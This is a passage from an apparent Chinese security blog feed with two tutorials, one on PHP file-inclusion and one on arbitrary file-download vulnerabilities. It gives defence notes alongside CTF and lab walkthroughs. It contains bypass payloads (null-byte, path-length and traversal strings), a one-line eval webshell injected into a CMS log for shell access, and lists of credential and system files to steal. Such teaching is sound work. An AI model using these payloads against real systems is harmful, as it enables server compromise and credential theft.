title="包含&#x2F;pros&#x2F;self&#x2F;environ"></a>包含&#x2F;pros&#x2F;self&#x2F;environ</h3><p><code>proc/self/environ</code>中会保存<code>user-agent</code>头，如果在<code>user-agent</code>中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p><p>利用条件：</p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- /proc/cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </span><br><span class="line">- /proc/meminfo：物理内存、交换空间等的信息 </span><br><span class="line">- /proc/mounts：已加载的文件系统的列表 </span><br><span class="line">- /proc/devices：可用设备的列表 </span><br><span class="line">- /proc/filesystems：被支持的文件系统 </span><br><span class="line">- /proc/modules：已加载的模块 </span><br><span class="line">- /proc/version：内核版本 </span><br><span class="line"></span><br><span class="line">- /proc/[pid]/cmdline：系统启动时输入的内核命令行参数。</span><br><span class="line">- /proc/[pid]/cwd：通过cwd命令可以直接跳转到当前目录。</span><br><span class="line">- /proc/[pid]/environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</span><br><span class="line"></span><br><span class="line">上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 **self** 来表示我们自己现在正在用的进程。</span><br></pre></td></tr></table></figure><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p><strong>如何获取临时文件的文件名</strong>：</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="黑名单（协议、路径限制）"><a href="#黑名单（协议、路径限制）" class="headerlink" title="黑名单（协议、路径限制）"></a>黑名单（协议、路径限制）</h3><p>使用 <code>str_replace()</code> 函数把 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code> 替换为了空值，来防止远程文件包含和相对路径的文件包含。</p><p><strong>绕过</strong>：在 <code>http://</code> 中再嵌套一个 <code>http://</code> ，以及在 <code>../</code> 中多嵌套一个 <code>../</code>，在 URL 中输入包含的文件名为 <code>..././..././phpinfo.php</code>，则可以绕过限制；另外，也可以使用绝对路径的文件包含。</p><h3 id="固定后缀"><a href="#固定后缀" class="headerlink" title="固定后缀"></a>固定后缀</h3><p>使用<code>include ( $filename.&quot; .html&quot; );</code>之类的方式固定后缀。但是存在绕过。</p><p><strong>绕过</strong>：各种截断：%00截断、路径长度截断、问号截断、#号截断、空格绕过等。</p><h3 id="固定所要包含的文件"><a href="#固定所要包含的文件" class="headerlink" title="固定所要包含的文件"></a>固定所要包含的文件</h3><p>不传参，直接写死include的文件。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="无限制文件包含"><a href="#无限制文件包含" class="headerlink" title="无限制文件包含"></a>无限制文件包含</h3><p>无限制文件包含是指对于所包含的文件没有限制。无需绕过，可以直接进行文件包含攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用条件</strong>:</p><p>需要 <code>allow_url_include=on</code></p><p><code>http://127.0.0.1:8080/include.php?filename=../../www.txt</code> 包含本地相对路径的文件。</p><p><code>http://127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt</code></p><p>包含在xiaohua.txt中的PHP代码通过远程文件包含被成功当成PHP代码解析。</p><h3 id="有限制文件包含（需要绕过）"><a href="#有限制文件包含（需要绕过）" class="headerlink" title="有限制文件包含（需要绕过）"></a>有限制文件包含（需要绕过）</h3><p>有限制文件包含是指当代码中存在特定的前缀或者.php、.html等扩展名过滤时，攻击者 <strong>需要绕过前缀或者扩展名过滤</strong>，才能执行远程URL中恶意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">include</span>(<span class="variable">$filename</span>.”.html”);    <span class="comment">// 在文件名后面强制增加html后缀</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含文件失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085328234.png" alt="image-20220805085328234"></p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断。</p><p>例如：<code>http://127.0.0.1/test.php?filename=xiaohua.txt%00</code></p><p><strong>利用条件：</strong></p><ol><li><p>magic_quotes_gpc&#x3D;off</p></li><li><p>PHP&lt;5.3.4</p></li></ol><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。</p><p><strong>利用条件</strong></p><p>Windows下目录的最大路径256B</p><p>Linux下目录的最大路径长度为4096B（根据服务器操作系统决定）</p><p>测试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>成功绕过，执行1.txt的内容<code>&lt;?php echo phpinfo() ?&gt;</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085949121.png" alt="image-20220805085949121"></p><h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><p>点号截断适用于Windows系统，当点号的长度大于256B时，就可以造成扩展名截断。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805090229043.png" alt="image-20220805090229043"></p><h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><p>因为问号会分隔实际的 URL 和参数</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt?</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091001770.png" alt="image-20220805091001770"></p><h4 id="＃号绕过"><a href="#＃号绕过" class="headerlink" title="＃号绕过"></a>＃号绕过</h4><p>因为 # 表示书签</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%23</code></p><p>注意<code>#</code>要编码为<code>%23</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091124899.png" alt="image-20220805091124899"></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%20</code></p><p>注意空格要编码为<code>%20</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091238408.png" alt="image-20220805091238408"></p><h3 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h3><p>使用相对路径 ..&#x2F;..&#x2F; 来返回上一目录，被称为目录遍历(Path Traversal)。</p><p>例如 <code>?file=../../phpinfo/phpinfo.php</code></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="某CMS程序文件包含利用-黑盒"><a href="#某CMS程序文件包含利用-黑盒" class="headerlink" title="某CMS程序文件包含利用-黑盒"></a>某CMS程序文件包含利用-黑盒</h3><p>易酷CMS是一款影片播放CMS。该CMS2.5版本存在本地文件包含漏洞。我们可以利用这个漏洞，利用报错信息将一句话木马写入日志中。然后利用文件包含漏洞包含该日志文件，再用菜刀连接拿shell。</p><p>我们通过访问下面的url，将一句话木马写入日志文件中。由于文件包含时会自动将文件内容解析为php代码，所以下面的URL中并没有使用<code>&lt;?php ?&gt;</code>。该URL会发生报错：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/&#123;~eval($_POST[x])&#125;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105735348.png" alt="image-20220805105735348"></p><p>然后就生成了相应的日志文件，文件存储有URL中的恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105845794.png" alt="image-20220805105845794"></p><p>该日志是以时间日期命名的，测试一句话木马：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/../temp/logs/20_08_14.log</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805110122484.png" alt="image-20220805110122484"></p><p>用菜刀连接该日志文件，得到shell。</p><h3 id="CTF-南邮大"><a href="#CTF-南邮大" class="headerlink" title="CTF-南邮大"></a>CTF-南邮大</h3><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><p>进入网站：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095409995.png" alt="image-20220805095409995"></p><p>点击click me? no，发生跳转：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095508199.png" alt="image-20220805095508199"></p><ul><li><strong>确定是否为文件包含</strong></li></ul><p>发现网站URL的参数名为file且接收一个文件名，判断可能考察文件包含。直接访问show.php看看：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100147678.png" alt="image-20220805100147678"></p><p><strong>与<code>file=show.php</code>显示是一样的，说明<code>index.php?file=show.php</code>存在文件包含</strong>。</p><ul><li><strong>尝试包含其他文件</strong></li></ul><p>尝试使用php:&#x2F;&#x2F;input进行文件包含攻击，执行恶意php代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100427271.png" alt="image-20220805100427271"></p><p>执行失败，说明存在过滤，可能检测到了php之类的关键字，或者<code>allow_url_include</code> 不为on。</p><p>尝试使用不受<code>allow_url_include</code>限制的<code>php://filter</code>读取文件，判断是哪种情况：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101720074.png" alt="image-20220805101720074"></p><p>发现读取成功，说明是<code>allow_url_include</code> 不为on。</p><p>把读取内容base64解码，找到flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101917895.png" alt="image-20220805101917895"></p><h3 id="i春秋web-include百度杯真题"><a href="#i春秋web-include百度杯真题" class="headerlink" title="i春秋web include百度杯真题"></a>i春秋web include百度杯真题</h3><p>进入题目链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102613276.png" alt="image-20220805102613276"></p><p>网页给出了网站的php源码，发现存在文件包含。</p><p>尝试提交path参数，包含phpinfo.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103044931.png" alt="image-20220805103044931"></p><p>尝试包含index.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102851837.png" alt="image-20220805102851837"></p><p>发现存在index.php。改为index.phP，发现报错。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103606874.png" alt="image-20220805103606874"></p><p>说明系统对大小写敏感，为linux系统，而且从报错信息来看也知道是linux。</p><p>进一步尝试使用<code>php://input</code>来包含恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103801767.png" alt="image-20220805103801767"></p><p>查看可疑文件，查看页面源代码，得到flag：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103943697.png" alt="image-20220805103943697"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103953364.png" alt="image-20220805103953364"></p><p>或者也可以使用<code>php://filter</code>读取该文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104100186.png" alt="image-20220805104100186"></p><p>然后base64解码即可。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104151328.png" alt="image-20220805104151328"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliy</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件下载</title>
    <link href="https://frankcao3.github.io/posts/18452"/>
    <id>https://frankcao3.github.io/posts/18452</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:01:11.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>网站上文件下载功能的实现通常是通过对参数filename的值的对应，获取在服务器上所需下载的文件的绝对路径，然后读取文件内容并发送给客户端进行下载。</p><p>如果这些有下载功能的网站<strong>没有对前端用户的下载请求的文件类型、目录做合理严谨的规则进行过滤</strong>，导致用户<strong>通过路径回溯符<code>../</code>等相关操作，跳出了程序本身的限制目录</strong>，然后再利用文件下载功能，使前端下载请求可以下载服务器中的任意文件。</p><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><p>网站给用户提供了下载文件的功能，并能接收相关的参数变量</p><p>后端使用了读取文件的相关函数</p><p>网站对前端用户读取文件的请求没有进行相应的控制或控制不严（限制、校验）</p><p>网站能输出请求文件的内容，提供给前端下载</p><h3 id="文件下载漏洞的挖掘"><a href="#文件下载漏洞的挖掘" class="headerlink" title="文件下载漏洞的挖掘"></a>文件下载漏洞的挖掘</h3><h4 id="寻找漏洞位置"><a href="#寻找漏洞位置" class="headerlink" title="寻找漏洞位置"></a>寻找漏洞位置</h4><p>找到有文件下载功能的网站：</p><ul><li><p>根据功能：一般可以根据下载功能去找，一些明显的软件下载网站等；</p></li><li><p>根据关键字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">down.php?file=</span><br><span class="line"></span><br><span class="line">data.php?file=</span><br><span class="line">read.xxx?filename=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;ReadPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;Inputfile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h4 id="分析下载链接中的参数变量"><a href="#分析下载链接中的参数变量" class="headerlink" title="分析下载链接中的参数变量"></a>分析下载链接中的参数变量</h4><p>一般要先解码。</p><p>比如<code>http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTExMTcveXN0XzEuNC41X2RhbmdiZWkuYXBr</code></p><p>s的值经过base64解码后得到下载文件路径：<code>down/20211117/yst_1.4.5_dangbei.apk</code></p><p>然后看参数能否修改。</p><p><strong>linux的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd            //保存了系统中所有的用户信息</span><br><span class="line">/etc/shadow            //用户的密码信息</span><br><span class="line">/root/.ssh/authorized_keys               //公钥文件</span><br><span class="line">/root/.bash_history                      //用户终端操作历史记录</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf   //apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf           //虚拟网站设置</span><br><span class="line">/usr/local/app/php5/lib/php.ini          //php相关设置</span><br><span class="line">/etc/httpd/conf/httpd.conf               //apache</span><br><span class="line">/etc/php5/apache2/php.ini                //ubuntu系统的默认路径</span><br></pre></td></tr></table></figure><p><strong>windows的一些系统文件路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini                //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml                //查看IIS虚拟主机配置文件</span><br><span class="line">C:\windows\repair\sam                 //存储Windows系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini         //mysql配置，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD                    //mysql.user表中的数据库连接密码</span><br><span class="line">C:\windows\php.ini php.ini                                    //php配置文件</span><br><span class="line">C:\Windows\system.ini                                         //winnt的php配置信息</span><br><span class="line">C:\Windows\win.ini                                            //winnt的mysql配置文件</span><br><span class="line">C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini         //存储虚拟主机网站路径和密码</span><br><span class="line">C:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf     //查看WINDOWS系统apache文件</span><br><span class="line">C:/Resin-3.0.14/conf/resin.conf                               //查看jsp开发的网站resin文件配置信息.</span><br><span class="line">C:\Windows\System32\drivers\etc\hostswinserver                //配置Telnet信息</span><br></pre></td></tr></table></figure><p><strong>tomcat的一些配置文件的路径：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apache-tomcat-8.5.51/conf/tomcat-users.xml              //tomcat的角色(授权用户)配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/server.xml                    //tomcat的主配置文件</span><br><span class="line">apache-tomcat-8.5.51/conf/web.xml                       //tomcat应用程序的部署描述符文件</span><br><span class="line">apache-tomcat-8.5.51/logs/catalina.out</span><br><span class="line">// 即tomcat的标准输出和标准出错，所有输出到这两个位置的都会进入catalina.out，这里包含tomcat运行自己输出的日志以及应用里向console输出的日志。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apache：</span><br><span class="line">    /etc/httpd/conf/httpd.conf</span><br><span class="line">    /etc/apache2/httpd.conf</span><br><span class="line">    /etc/apache2/apache2.conf</span><br><span class="line">nginx：</span><br><span class="line">    /etc/nginx/nginx.conf</span><br><span class="line">    /usr/local/nginx/conf/nginx.conf</span><br><span class="line">    /usr/local/etc/nginx/nginx.conf</span><br><span class="line">redis：</span><br><span class="line">    /etc/redis.conf</span><br><span class="line">    index.php?f=../../../../../../etc/passwd </span><br></pre></td></tr></table></figure><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p><strong>下载服务器的任意文件</strong>：</p><p>获得网站<strong>web源码</strong>，再对代码进行审计，以获得更多的漏洞</p><p>获得网站、服务器、系统、数据库等<strong>中间件配置文件</strong></p><p>获得应用的<strong>系统配置文件</strong></p><p><strong>内网探测</strong></p><p>下载各种.log文件，并寻找后台地址、文件上传点等地方</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>以pikachu为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811205457049.png" alt="image-20220811205457049"></p><h4 id="分析下载文件的URL"><a href="#分析下载文件的URL" class="headerlink" title="分析下载文件的URL"></a>分析下载文件的URL</h4><p>直接在网站上查看图片，可以知道图片在网站内的存储地址：<code>http://10.1.1.7/vul/unsafedownload/download/rayal.png</code></p><p>该图片的下载链接为：<code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=rayal.png</code></p><h4 id="测试能否下载其他文件"><a href="#测试能否下载其他文件" class="headerlink" title="测试能否下载其他文件"></a>测试能否下载其他文件</h4><p>通过上面的两个下载的地址我们可以可以测试文件下载漏洞：</p><p><code>http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../execdownload.php</code></p><p>根据上面的分析通过链接下载到了文件<code>execdownload.php</code>。</p><p>很明显filename参数这里存在文件下载漏洞。</p><h4 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h4><p>接下来可以使用御剑、铸剑等工具进行探针，看一看存在哪些敏感文件，构造我们所需要的下载链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212858165.png" alt="image-20220811212858165"></p><h4 id="下载敏感文件进一步攻击"><a href="#下载敏感文件进一步攻击" class="headerlink" title="下载敏感文件进一步攻击"></a>下载敏感文件进一步攻击</h4><p>下载好的文件代码中去分析路径和文件包含。</p><p>举例：config.php配置文件—&gt;得到数据库密码—&gt;连接数据库</p><p><code>http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../../inc/function.php</code></p><p>下载成功：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811212931057.png" alt="image-20220811212931057"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>净化数据：</p><p>对用户传过来的<strong>文件名参数进行统一编码</strong></p><p><strong>对文件类型进行白名单控制</strong></p><p>对包含恶意字符或者空字符的参数进行拒绝。比如**过滤.(点)**，使用户在url中不能回溯上级目录，正则严格判断用户输入参数的格式。</p></li><li><p>要下载的文件地址保存至数据库中，与网站目录隔开。</p></li><li><p>文件路径保存至数据库，让用户提交文件对应ID下载文件。</p></li><li><p>用户下载文件之前需要进行<strong>权限判断</strong>。</p></li><li><p>文件放在web无法直接访问的目录下。</p></li><li><p>不允许提供目录遍历服务。</p></li><li><p>公开文件可放置在web应用程序下载目录中通过链接进行下载。</p></li><li><p>php.ini配置open_basedir限定文件访问范围。</p></li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://blog.csdn.net/m0_62619269/article/details/125043182">https://blog.csdn.net/m0_62619269/article/details/125043182</a></p><p><strong>[RoarCTF 2019]Easy Java</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093558024.png" alt="image-20220812093558024"></p><p>登录界面尝试SQL注入，没有注入点，点击help：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812093722952.png" alt="image-20220812093722952"></p><ul><li><p><strong>分析文件下载URL</strong></p><p>URL中存在filename参数，推测可能存在文件下载漏洞。</p><p>该链接以get请求文件，但是失败，因为Java一般文件下载以post方式提交。</p><p>所以尝试用POST方式来进行请求，发现可以下载文件。下载了一个help.docx的文件。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812094228417.png" alt="image-20220812094228417"></p><ul><li><p><strong>尝试下载其他文件</strong></p><p>这里要用到 <strong>web-inf</strong> 的知识：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这里对WEB-INF进行一个简单的了解。</span><br><span class="line"></span><br><span class="line">WEB-INF是java的WEB应用的安全目录。</span><br><span class="line">1.WEB-INF/web.xml:web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</span><br><span class="line">2.WEB-INF/classes:包含了站点所有用的class文件，包括servlet class和非servlet class</span><br><span class="line">3.WEB-INF/lib:存放web应用需要的JAR文件</span><br><span class="line">4.WEB-INF/src:源码目录，按照包名结构放置各个java文件</span><br><span class="line">5.WEB-INF/database.properties:数据库配置文件</span><br><span class="line">6.WEB-INF/tags:存放了自定义标签文件</span><br><span class="line">7.WEB-INF/jsp:jsp 1.2 一下版本的文件存放位置。</span><br><span class="line">8.WEB-INF/jsp2:存放jsp2.0以下版本的文件。</span><br><span class="line">9.META-INF:相当于一个信息包。</span><br></pre></td></tr></table></figure><p>尝试将参数的值换为<code>WEB-INF/web.xml</code>，发现成功返回内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析文件内容发现可疑class文件。</p><p>构造payload：<code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>，下载FlagController.class。</p><p>下载后，文件内容中存在base64编码：</p><p><code>String flag = &quot;ZmxhZ3thNTkzMTBiMy1lZjkzLTQ5ODktOTVlMC0zYTQ2ZmZhMThiYjh9Cg==&quot;;</code></p><p>解码即可得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件下载&quot;&gt;&lt;a href=&quot;#文件下载&quot; class=&quot;headerlink&quot; title=&quot;文件下载&quot;&gt;&lt;/a&gt;文件下载&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件读取</title>
